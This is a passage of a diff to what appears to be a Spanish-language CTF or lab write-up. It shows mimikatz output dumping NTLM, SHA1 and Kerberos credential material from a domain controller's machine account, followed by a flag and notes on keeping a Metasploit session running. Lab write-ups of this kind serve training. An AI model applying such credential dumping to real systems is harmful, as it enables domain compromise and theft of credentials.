+         * Password : 4c 83 01 79 78 de a3 1c 38 c6 ae fa e4 57 71 2b 28 4a 77 b1 a3 fd 63 9e be e3 81 64 b0 ea 94 d4 f1 eb 98 c3 cc af b5 66 8b 88 ba 30 50 87 74 3d cd 38 89 96 f1 58 05 24 e5 c9 e8 9d ca c6 fe f8 93 cd d1 65 a6 3e 88 a4 f9 53 72 66 55 7b 30 c0 54 18 a6 61 db 93 a9 11 96 62 34 da fb 74 d5 87 b7 04 0d b2 d6 1d 33 2e 5d f3 bb 76 42 73 5d 9e 61 5b ca 21 12 d8 94 3c cf d6 03 43 d6 23 62 c5 e1 78 8b 2e 2a 78 d0 91 fd 57 c8 f4 3e 9f c6 e4 2c 0b 7c a9 5e 2d f3 35 05 13 a9 61 b3 7d 63 eb 0e 27 14 2d b6 70 95 b4 2f e2 6e d4 e0 74 a6 82 23 ab 83 07 77 4e 34 ff 56 c6 5e 86 95 d0 5b a1 ab c8 40 17 57 17 0f ea e1 5f 49 90 5b 75 96 51 0e 0e ba 0c 38 ec 08 8e f6 06 83 ce 9a 1d b0 15 24 36 85 a2 de 12 5f ff aa 37 db 92 5e 96 5d ed 
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 48784 (00000000:0000be90)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:21:13 PM
+SID               : 
+        msv :
+         [00000003] Primary
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 1f2b1955a41f26eb6b3f5d291e300ce9
+         * SHA1     : 08ac59fd0552ae0c628f2c86409ff11da9bd9770
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DCSRV1$
+Domain            : BEYOND
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:21:13 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : DCSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : dcsrv1$
+         * Domain   : BEYOND.COM
+         * Password : 4c 83 01 79 78 de a3 1c 38 c6 ae fa e4 57 71 2b 28 4a 77 b1 a3 fd 63 9e be e3 81 64 b0 ea 94 d4 f1 eb 98 c3 cc af b5 66 8b 88 ba 30 50 87 74 3d cd 38 89 96 f1 58 05 24 e5 c9 e8 9d ca c6 fe f8 93 cd d1 65 a6 3e 88 a4 f9 53 72 66 55 7b 30 c0 54 18 a6 61 db 93 a9 11 96 62 34 da fb 74 d5 87 b7 04 0d b2 d6 1d 33 2e 5d f3 bb 76 42 73 5d 9e 61 5b ca 21 12 d8 94 3c cf d6 03 43 d6 23 62 c5 e1 78 8b 2e 2a 78 d0 91 fd 57 c8 f4 3e 9f c6 e4 2c 0b 7c a9 5e 2d f3 35 05 13 a9 61 b3 7d 63 eb 0e 27 14 2d b6 70 95 b4 2f e2 6e d4 e0 74 a6 82 23 ab 83 07 77 4e 34 ff 56 c6 5e 86 95 d0 5b a1 ab c8 40 17 57 17 0f ea e1 5f 49 90 5b 75 96 51 0e 0e ba 0c 38 ec 08 8e f6 06 83 ce 9a 1d b0 15 24 36 85 a2 de 12 5f ff aa 37 db 92 5e 96 5d ed 
+        ssp :
+        credman :
+        cloudap :
+
+mimikatz # 
+```
+flag 8480fa6ca85394df498139fe5ca02b95
 
 ## Troubleshooting
+
+**Tener la session MSF en ejecucion**
+**Respetar el orden en el cual se ejecutan los comandos**
 
 ## Herramientas Alternativas
 - [ ] **Herramienta 1:** Descripción breve (Comando)
